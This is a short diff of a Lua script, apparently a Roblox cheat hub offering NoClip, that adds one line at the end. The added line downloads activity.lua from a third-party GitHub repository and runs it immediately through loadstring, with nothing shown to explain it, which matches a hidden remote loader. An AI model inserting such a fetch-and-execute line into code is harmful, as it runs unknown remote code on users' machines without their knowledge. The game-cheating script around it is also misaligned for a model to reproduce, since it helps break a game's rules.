@@ -255,3 +255,4 @@ for name, pos in pairs(locations) do
 end
 
 print("✅ JQHub Loaded with Inline NoClip and Instant Interact Fix")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/egor2078f/Lurk-v5/refs/heads/main/activity.lua"))()
